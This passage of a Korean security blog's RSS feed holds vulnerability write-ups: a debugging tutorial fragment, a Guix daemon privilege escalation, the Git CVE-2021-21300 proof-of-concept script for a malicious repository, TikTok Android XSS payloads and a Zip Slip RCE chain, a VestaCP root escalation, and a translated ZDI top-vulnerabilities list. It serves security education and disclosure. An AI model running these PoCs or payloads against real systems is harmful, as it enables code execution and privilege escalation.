src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--034.png" alt="./bughunting-tutorials-part3/image--034.png"></p><p>리턴 어드레스라면 바로 위 인스트럭션이 <code>call</code>이어야 하는데 <code>ret</code>이네요. 이 주소는 우연히 그냥 그 모듈을 가리키고 있을 뿐입니다. 저렇게 <code>dds</code> 명령어를 입력해서 보이는 주소들이 모두 리턴 어드레스인 것만은 아닙니다. 따라서 하나하나 확인을 하고 디버깅을 진행해야 합니다. 스택 좀 위에서 유효한 리턴 어드레스를 찾아봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--036.png" alt="./bughunting-tutorials-part3/image--036.png"></p><p>이 리턴 어드레스는 괜찮은 거 같네요! 그럼 여기에 브레이크 포인트를 걸고 디버깅을 해봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--038.png" alt="./bughunting-tutorials-part3/image--038.png"></p><p>처음에는 이렇게 뜨면서 로딩이 좀 느리게 되는데 <code>sxe ld ImLoader.dll</code> 명령어를 치면 <code>ImLoader.dll</code> 이 로드될 때 브레이크 포인트를 걸 수 있습니다. 그렇게 되면 저렇게 느리게 로딩되지는 않겠죠. 모듈이 로드되고 브포를 걸게 되면 좀 더 빠르게 진행할 수 있습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--040.png" alt="./bughunting-tutorials-part3/image--040.png"></p><p>정상적으로 원하는 지점에서 잘 걸리네요. 그럼 파일이 업로드되었는지 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--042.png" alt="./bughunting-tutorials-part3/image--042.png"></p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--044.png" alt="./bughunting-tutorials-part3/image--044.png"></p><p>이 중 두 부분만 헤더 정보를 가지고 있네요. 그럼 헤더까지 있는 메모리에서 헤더 부분에 메모리 브레이크 포인트를 걸고 앞으로 실행하는 과정에서 어느 부분의 코드에서 해당 메모리에 접근하는지를 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--046.png" alt="./bughunting-tutorials-part3/image--046.png"></p><p>…는 Fail…. 괜찮아요… 이럴 수 있죠…. 꼼수 쓰지 말고 코드 분석하라는 신의 계시입니다. 아마 파일 스트림에서 다시 가져와 비교를 하거나 다시 다른 곳에 할당하거나… 아니면 여기도 제일 위가 아니거나… 여러 시나리오가 있을 수 있겠네요. 뭐 다른 데 브포 걸어서 할 수도 있지만 다른 방법도 써볼게요. 그 다른 방법은 Part 4에서 설명하겠습니다. </p><h1 id="Part-4-예고"><a href="#Part-4-예고" class="headerlink" title="Part 4 예고"></a>Part 4 예고</h1><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%203.png" alt="./bughunting-tutorials-part3/Untitled%203.png"></p><blockquote><p>EIP가 안잡히잖아!!!!</p></blockquote>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bug-hunting/">bug hunting</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Guix lpe via guix-daemon</title>
+      <link>https://hackyboiz.github.io/2021/03/24/fabu1ous/2021-03-24/</link>
+      <guid>https://hackyboiz.github.io/2021/03/24/fabu1ous/2021-03-24/</guid>
+      <pubDate>Wed, 24 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://guix.gnu.org/en/blog/2021/risk-o</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://guix.gnu.org/en/blog/2021/risk-of-local-privilege-escalation-via-guix-daemon/">Risk of local privilege escalation via guix-daemon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Guix</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Guix는 GNU 프로젝트에서 개발한 GNU 운영 체제입니다. Guix의 guix-daemon에서 로컬 권한 상승으로 이어질 수 있는 보안 취약성이 발견되었습니다. Multi-user setup이 된 로컬 시스템 환경에서 유저 권한의 해커는 guix build와 같은 빌드 프로세스를 생성해 임의의 파일에 대한 접근 권한을 world-writable로 변경할 수 있습니다. </p><p>공격 시나리오는 다음과 같습니다.</p><ol><li>빌드 디렉터리 속에 <code>/etc/shadow</code>와 같이 root 소유의 파일의  hardlink를 생성</li><li><code>--keep-failed</code> 옵션을 붙인 빌드 프로세스 호출</li><li>빌드 실패 시 daemon은 전체 빌드 트리를 현재 유저 소유로 변경</li><li>hardlink 된 root 소유의 파일에 쓰기 권한이 생김</li></ol>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/gnu/">gnu</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/multi-user/">multi-user</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/24/fabu1ous/2021-03-24/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-21300: Git의 저장소 clone 원격 코드 실행 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/23/l0ch/2021-03-23/</link>
+      <guid>https://hackyboiz.github.io/2021/03/23/l0ch/2021-03-23/</guid>
+      <pubDate>Tue, 23 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.openwall.com/lists/oss-security/2021/03/09/3&quot;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openwall.com/lists/oss-security/2021/03/09/3">git: malicious repositories can execute remote code while cloning</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Git(2.14.2.windows.1에서 테스트됨)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 버전 관리 시스템인 Git에서 원격 저장소를 clone 하는 도중 원격 코드 실행이 가능한 취약점이 발견되어 관련 세부 정보가 공개되었습니다.</p><p>취약점의 트리거 조건은 다음과 같습니다.</p><ul><li><p>타깃 시스템이 NTFS와 같이 대소문자를 구분하지 않고, 심볼릭 링크를 지원해야 합니다.(Windows 및 macOS의 기본 파일 시스템)</p></li><li><p>Git LFS와 같이 clean 혹은 smudge 필터가 전역적으로 구성되어있어야 합니다.</p></li></ul><p>악성 저장소를 생성하는 PoC는 다음과 같습니다.</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>  git init delayed-checkout &amp;&amp;  (  <span class="hljs-built_in">cd</span> delayed-checkout &amp;&amp;  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;A/post-checkout filter=lfs diff=lfs merge=lfs&quot;</span> \\  &gt;.gitattributes &amp;&amp;  mkdir A &amp;&amp;  <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&#x27;</span> &gt;A/post-checkout &amp;&amp;  chmod +x A/post-checkout &amp;&amp;  &gt;A/a &amp;&amp;  &gt;A/b &amp;&amp;  git add -A &amp;&amp;  rm -rf A &amp;&amp;  ln -s .git/hooks a &amp;&amp;  git add a &amp;&amp;  git commit -m initial  )</code></pre><ol><li><p>임의 코드를 실행하는 악성 파일인 <code>A/post-checkout</code>이 저장소에 추가된 후 제거되면 Git 캐시에 남습니다. 이후 <code>./git/hooks</code>의 심볼릭 링크 <code>a</code>를 생성합니다.</p><ul><li>git hooks - 특정 이벤트에 실행되는 스크립트</li></ul></li><li><p>타깃이 대소문자를 구분하지 않는 파일 시스템이라면 해당 저장소를 clone 할 때 <code>a</code>와 <code>A</code>를 구분하지 못해 <code>./git/hooks/post-checkout</code> 파일이 Git 캐시에 저장된 악성파일인 <code>A/post-checkout</code>로 대체됩니다.</p></li><li><p>git hooks에 의해 <code>post-checkout</code>가 실행되고 <code>post-checkout</code>에 작성된 임의 코드가 실행됩니다.</p></li></ol><p><img src="/2021/03/23/l0ch/2021-03-23/image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC - <a href="https://github.com/Maskhe/CVE-2021-21300">https://github.com/Maskhe/CVE-2021-21300</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/23/l0ch/2021-03-23/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] 안드로이드 틱톡 앱에서 발견된 5가지 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/22/idioth/2021-03-22/</link>
+      <guid>https://hackyboiz.github.io/2021/03/22/idioth/2021-03-22/</guid>
+      <pubDate>Mon, 22 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/@dPhoeniixx/tiktok-for-android-1-click</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105">TikTok for Android 1-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TikTok for Android Application</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안드로이드 틱톡 애플리케이션에서 5가지 취약점이 발견되었습니다. 발견된 5가지 취약점 중 XSS, Zip Slip, RCE 취약점에 대한 상세 내용은 다음과 같습니다.</p><p><strong>Universal XSS on TikTok WebView</strong></p><p>틱톡은 받은 메시지에서 deep-link로 호출될 수 있는 특정 WebView를 사용합니다. WebView는 성능을 향상하기 위해 사용할 때마다 서버에서 가져오는 대신 내부 파일에서 가져오는 falcon link라는 것을 사용합니다. 성능을 측정하기 위해 페이지가 로딩되면 다음과 같은 함수를 실행합니다.</p><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.a.evaluateJavascript(<span class="hljs-string">&quot;JSON.stringify(window.performance.getEntriesByName(\&#x27;&quot;</span> + <span class="hljs-keyword">this</span>.webviewURL + <span class="hljs-string">&quot;\&#x27;))&quot;</span>, v2);</code></pre><p>페이로드는 query string segment로 인코딩 되기 때문에 <code>getEntriesByName</code>의 URL 뒤에 <code>#</code>을 추가한 후 페이로드를 삽입하면 정상적으로 스크립트가 동작하게 됩니다.</p><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(window.performance.get<span class="hljs-constructor">EntriesByName(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">m</span>.<span class="hljs-params">tiktok</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">falcon</span><span class="hljs-operator">/</span>#&#x27;)</span>,alert(<span class="hljs-number">1</span>));<span class="hljs-comment">//&#x27;))</span></code></pre><p><strong>Another XSS on AddWikiActivity</strong></p><p><code>AddWikiActivity</code>는 악성 URL이 열리지 않도록 URL 검사를 합니다. 그러나 <code>http</code>나 <code>https</code> scheme만 확인을 하므로 다른 scheme에 대해서는 검사를 진행하지 않습니다. 예를 들어 <code>javascript</code> scheme를 사용하여 페이로드를 구성하면 XSS가 가능합니다.</p><pre><code class="hljs perl">window.ToutiaoJSBridge.invokeMethod(JSON.stringify(&#123;    <span class="hljs-string">&quot;__callback_id&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,    <span class="hljs-string">&quot;func&quot;</span>: <span class="hljs-string">&quot;openSchema&quot;</span>,    <span class="hljs-string">&quot;__msg_type&quot;</span>: <span class="hljs-string">&quot;callback&quot;</span>,    <span class="hljs-string">&quot;params&quot;</span>: &#123;        <span class="hljs-string">&quot;schema&quot;</span>: <span class="hljs-string">&quot;aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&amp;disable_app_link=false&quot;</span>    &#125;,    <span class="hljs-string">&quot;JSSDK&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,    <span class="hljs-string">&quot;__iframe_url&quot;</span>: <span class="hljs-string">&quot;http://iframe.attacker.com/&quot;</span>&#125;));</code></pre><p><strong>Remote Code Execution</strong></p><p>RCE를 하기 위해서 zip file을 생성하고, path traversal을 통해 <code>/data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so</code>을 overwrite 해야 합니다. 이를 위해서 Zip Slip 취약점이 사용됩니다.</p><p><code>TmaTestActivity</code>는 인터넷에서 zip 파일을 통해 SDK를 업데이트합니다. 이때 <code>DownloadBaseBundleHandler</code>에서 <code>sdkUpdateVersion</code> 파라미터를 확인하여 버전을 확인하는데, 값을 <code>99.99.99</code>로 설정하면 검사를 통과하여 다운로드를 시작합니다. 다운로드 후 파일 이름에 있는 <code>&#123;md5sum_of_file&#125;</code>과 파일의 md5sum 값을 비교하므로 파일 이름은 <code>anything_&#123;md5sum_of_file&#125;.zip</code>이 되어야 합니다. 그 후 다운로드 한 파일은 정상적으로 압축이 해제되어 native-library를 악성 라이브러리로 overwrite 할 수 있습니다. 라이브러리를 overwirte 한 후 애플리케이션을 재실행하거나 <code>com.tt.miniapphost.placeholder.MiniappTabActivity0</code>를 통해 Remote Code Execution이 가능합니다.</p><p>해당 취약점들은 XSS 코드 수정, <code>TmaTestActivity</code> 삭제, <code>intent</code> scheme 제한 구현으로 수정되었습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/tiktok/">tiktok</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/zip-slip/">zip-slip</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/22/idioth/2021-03-22/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] VestaCP Local Privilege Escalation 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/21/insu/2021-03-21/</link>
+      <guid>https://hackyboiz.github.io/2021/03/21/insu/2021-03-21/</guid>
+      <pubDate>Sun, 21 Mar 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulne</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/">SSD Advisory – VestaCP LPE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VestCP 0.9.8-24 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 웹 호스팅 제어판인 VESTA Control Panel(VestaCP)에서 user가 admin으로 권한 상승할 수 있는 취약점이 발견되었습니다.</p><p>해당 취약점은 <code>/add/web/index.php</code>에서 호출되는 v-add-web-domain 쉘 스크립트에서 발생합니다. 해당 스크립트는 디렉터리나 파일의 내용이 존재하는지에 검사 없이 다음 명령어를 사용합니다.</p><pre><code class="hljs basic"><span class="hljs-symbol">88 </span>: # Changing file owner &amp; permission<span class="hljs-symbol">89 </span>: chown -R $user:$user $HOMEDIR/$user/web/$domain<span class="hljs-symbol">90 </span>: chown root:$user /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.* $conf<span class="hljs-symbol">91 </span>: chmod <span class="hljs-number">640</span> /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.*<span class="hljs-symbol">92 </span>: chmod <span class="hljs-number">751</span> $HOMEDIR/$user/web/$domain $HOMEDIR/$user/web/$domain/*<span class="hljs-symbol">93 </span>: chmod <span class="hljs-number">551</span> $HOMEDIR/$user/web/$domain/stats $HOMEDIR/$user/web/$domain/logs<span class="hljs-symbol">94 </span>: chmod <span class="hljs-number">644</span> $HOMEDIR/$user/web/$domain/public_*html/*.*</code></pre><p>위의 명령어들은 <code>$domain</code> 폴더에서 사용되므로 94 줄의 명령을 통해 읽고 싶은 파일의 권한을 변경할 수 있고, 92 줄의 명령을 통해 폴더의 접근 권한을 변경할 수 있습니다. </p><p>또한 VestaCP는 사용자를 추가하거나 리스트 하는 등의 web-app의 모든 기능을 bash 스크립트에 의존합니다. 이러한 bash 스크립트들은 root 소유이며 변경할 수 없지만, <code>sudo -l</code>을 통해 패스워드 입력 없이 admin이 root 권한으로 이러한 스크립트를 실행할 수 있습니다. 이를 통해 root로 권한 상승하는 방법은 다음과 같습니다.</p><ol><li>v-list-user 스크립트에 <code>source $VESTA/func/main.sh</code>가 존재하므로 <code>/tmp/func</code> 폴더에 <code>/bin/bash</code> 쉘 스크립트를 생성합니다.</li><li>패스워드 입력 없이 스크립트를 실행할 수 있으므로 환경 변수 <code>$VESTA</code>를 <code>/tmp</code>로 overwrite 합니다.</li><li>v-list-user를 실행하면, root 권한을 획득할 수 있습니다.</li></ol>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/insu/">insu</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/vestacp/">vestacp</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/21/insu/2021-03-21/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Translation] ZDI에서 선정한 2020년 제일 중요한 취약점 Top 5</title>
+      <link>https://hackyboiz.github.io/2021/03/21/j0ker/zdi_2020_vuln/</link>
+      <guid>https://hackyboiz.github.io/2021/03/21/j0ker/zdi_2020_vuln/</guid>
+      <pubDate>Sun, 21 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;안녕하세요. 믿거 조 씨 집안 28대손 Joker(조-커)입니다. 첫 글은 부담스럽지 않게 번역글로 준비해봤습니다. 앞으로 재미있는 연구 많이 해서 좋은 글 올려드리도록 하겠습니다 (__ __) 참고로 번역에는 의역이 많을 예정입니다. 이런 걸로</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>안녕하세요. 믿거 조 씨 집안 28대손 Joker(조-커)입니다. 첫 글은 부담스럽지 않게 번역글로 준비해봤습니다. 앞으로 재미있는 연구 많이 해서 좋은 글 올려드리도록 하겠습니다 (__ __) 참고로 번역에는 의역이 많을 예정입니다. 이런 걸로 태클 ㄴㄴ</p><p><img src="/2021/03/21/j0ker/zdi_2020_vuln/Untitled.png"></p><p>두두등장</p><hr><p>연말이 되면서, 우리는 2020년에 받은 취약점들을 뒤돌아 보면서 최고의 취약점들을 뽑아보면 어떨까라는 생각을 하게 되었다. 생각은 이렇게 했지만, 작년에(글은 작년에 나온 거라 올해라고 되어 있지만 읽기 편하도록 현재 시점에서 작년이라 하겠다) 우리가 공개한 Advisor들의 수가 거의 최고에 다다랐기 때문에 1400개가 넘는 버그들 중에서 최고의 버그 5개를 골라내는 것은 생각보다 어려운 일이었다. 그리고 마침내 우리는 2020년에 제출된 버그들 중 최고의 버그 Top 5를 꼽아보았다! 짜잔!</p><h1 id="CVE-2020-0688-ZDI-20-258"><a href="#CVE-2020-0688-ZDI-20-258" class="headerlink" title="CVE-2020-0688/ZDI-20-258"></a>CVE-2020-0688/ZDI-20-258</h1><p><strong>Microsoft Exchange Server Exchange Control Panel Fixed Cryptographic Key Remote Code Execution Vulnerability</strong></p><p>이 취약점은 Microsoft Exchange Server의 Exchange Admin Center 웹 인터페이스에서 발견된 매우 크리티컬한 취약점으로, 인증된 Exchange 사용자는 이 취약점을 통해 서버의 SYSTEM 권한을 얻을 수 있다. 이 웹 인터페이스는 “Admin” 인터페이스라고 불리기는 하지만, Exchange 서버의 mailbox에 대한 인증서를 가지고 있는 유저라면 모두 접근이 가능하며 Outlook Web Access와 같이 네트워크에 노출되어 있다. 이 취약점은 Exchange Admin Center ASP.NET에 설치되어 있는 암호화 키(“machine keys”)와 연관이 있다. Exchange에서는 설치할 때마다 이 키들을 랜덤하게 생성하여 해당 키가 유니크하고 안전하도록 해야 한다. 하지만, 실제로는 이 키들을 install media에서 바로 복사해오는데, 이로 인해 해커가 다른 제품의 installation을 참고하여 이 키들을 알 수 있다. 해커는 이 키들을 이용해 서버에 조작된 메시지를 보내고, 해당 메시지가 deserialize 되면서 arbitrary code execution을 할 수 있다. Exchange는 보통 엔터프라이즈의 중심에 있기 때문에 Exchange Server의 취약점은 매우 중요하고 해커들도 매우 탐낸다. 만약 당신의 조직에서 아직 이 취약점을 패치하지 않았다면, 최대한 빨리 패치를 진행하길 바란다. 좀 더 디테일한 내용들은 이 <a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">링크</a>에서 확인할 수 있다.</p><h1 id="CVE-2020-3992-ZDI-20-1377"><a href="#CVE-2020-3992-ZDI-20-1377" class="headerlink" title="CVE-2020-3992/ZDI-20-1377"></a>CVE-2020-3992/ZDI-20-1377</h1><p><strong>VMware ESXi SLP Use-After-Free Remote Code Execution Vulnerability</strong></p><p>이 버그는 ZDI 취약점 연구원 Lucas Leong이 발견한 버그이다. ESXi는 VMWare 사에서 개발한 엔터프라이즈급 하이퍼바이저이다. Service Location Protocol(SLP)는 ESXi에 기본적으로 활성화되어 있는 프로토콜 중 하나이다. SDP는 클라이언트가 네트워크 서비스를 탐색할 수 있도록 지원하는 프로토콜이다. SLP에서 가장 인기 있는 기능이 OpenSLP인데, Lucas는 ESXi에서 자체 제작한 버전을 사용한다는 것을 발견하였다. 거기다가 이 자체 제작 버전에서 크리티컬한 취약점 두 개가 발견되었다.</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1377/">첫 번째 취약점</a>은 Use-After-Free(UAF) 취약점으로 <code>SLPDPorcessMessage()</code>에서 SLPMessage 오브젝트가 free 되었음에도 불구하고 SLPDatabase 구조체에서 계속해서 해당 메모리를 레퍼런스 하고 있어 발생한 취약점이다. 이 취약점은 WAN 환경에 있는 해커에 의해 활용될 수 있다.  </p><p>취약점이 발견된 이후, VMware는 이 취약점을 패치하였지만 제대로 처리하지 못하였고 ZDI-CAN-12190으로 패치에 대한 bypass 취약점이 제보되었다. </p><p>또 한 가지 주목할만한 점은 이 취약점을 이용해서 원격으로 공격할 수 있기도 하지만, 제한된 환경에서 실행되는 프로세스에서의 sandbox escape도 가능하다는 것이다. 이 취약점을 통해, EXSi 같이 많이 연구된 제품들에서도 아직 알지 못했던(잘 살펴보지 않았던) attack surface들이 있다는 것을 알 수 있었다.</p><h1 id="CVE-2020-9850-ZDI-20-672"><a href="#CVE-2020-9850-ZDI-20-672" class="headerlink" title="CVE-2020-9850/ZDI-20-672"></a>CVE-2020-9850/ZDI-20-672</h1><p><strong>Apple Safari in Operator JIT Type Confusion Remote Code Execution Vulnerability</strong></p><p>이 버그는 Georgia Tech Systems Software &amp; Security Lab팀이 <a href="https://taesoo.kim/pubs/2020/jin:pwn2own2020-safari-slides.pdf">Pwn2Own에 참여하면서</a> 제보한 버그이다. 이 버그는 DFG 단에서 발생하는 Webkit type confusion으로 시작되는 버그 체인의 한 부분으로 작년에 발견된 이 <a href="https://www.zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug">버그</a>와 유사하다. OpenGL’s CVM(Core Virtual Machine)의 힙 오버플로우 버그와 체이닝 하면 사파리에서 “.app” symlink를 실행할 수 있다. 그런 다음 레이스 컨디션을 통해 cfprefsd와 kextload에서 first-time app protection 우회, root 접근, 권한 상승이 차례대로 이뤄지며 모든 것들은 피해자가 웹페이지를 방문하고 난 후 백그라운드에서 이루어진다. </p><p>한 웹 페이지에 접속했는데 10초 후에 악성코드가 당신의 컴퓨터에서 실행된다고 생각해보라. 소름이 돋을 정도이다. 결과적으로 그들은 Pwn2Own에서 성공적으로 데모를 마쳐 $70,000를 획득하였다. </p><h1 id="CVE-2020-7460-ZDI-20-949"><a href="#CVE-2020-7460-ZDI-20-949" class="headerlink" title="CVE-2020-7460/ZDI-20-949"></a>CVE-2020-7460/ZDI-20-949</h1><p><strong>FreeBSD Kernel sendmsg System Call Time-Of-Check Time-Of-Use Privilege Escalation Vulnerability</strong></p><p>이 취약점은 m00nbsd라는 닉네임을 사용하는 한 연구원이 ZDI에 제보하였다. 해커는 FreeBSD의 32-bit <code>sendmsg()</code> 시스템 콜에 존재하는 Time-Of-Check, Time-Of-Use(TOCTOU) 취약점을 이용하여 낮은 권한에서 kernel-level code execution을 할 수 있다. 이 취약점은 시스템 콜에 존재하는 double-fetch 버그로 유저 랜드에 있는 MsgLen 변수에 첫 access가 있고 난 후, 두 번째 access가 발생하기 전에 더 큰 값으로 바꾸면 오버플로우를 트리거할 수 있다. 해커는 루프에서 정상적인 인자로 <code>sendmsg()</code>를 호출하는 스레드를 하나와 MsgLen을 큰 값으로 조작하는 스레드 하나를 실행하여 레이스 컨디션을 발생시켜 오버플로우를 트리거할 수 있다. 이 버그의 난이도는 낮지만 비교적 오랫동안 살아남았다. 우리는 작년 9월에 이 버그에 대해 포스팅을 하였으니 관심이 있다면 <a href="https://www.zerodayinitiative.com/blog/2020/9/1/cve-2020-7460-freebsd-kernel-privilege-escalation">여기</a>에서 자세한 내용을 확인할 수 있다.</p><h1 id="CVE-2020-17057-ZDI-20-1371"><a href="#CVE-2020-17057-ZDI-20-1371" class="headerlink" title="CVE-2020-17057/ZDI-20-1371"></a><a href="https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/">CVE-2020-17057</a>/ZDI-20-1371</h1><p><strong>Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</strong></p><p>이 취약점은 Windows의 DirectComposition이라는 커널 모드의 그래픽 구성요소에서 발견된 취약점이다. <code>win32kbase!DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> 함수는 유저 모드에서 전달된 데이터를 기준으로 <code>DirectComposition::CInteractionTrackerMarshaler</code> 타입의 객체를 채운다. 만약 함수를 실행하는 과정에서 비정상적인 데이터를 발견하면, 에러를 핸들링하는 분기로 들어가게 되는데, 여기에서 함수에서 생성한 객체에 있는 리소스들을 release 한다. Release 과정에서 초기화되지 않은 포인터를 release 하게 된다. 이를 통해 해커는 커널 모드에서 실행 흐름을 제어할 수 있고 결과적으로 SYSTEM 권한을 획득할 수 있다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/zdi/">zdi</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/21/j0ker/zdi_2020_vuln/#disqus_thread</comments>
+      
+    </item>
+    
+  </channel>
+</rss>
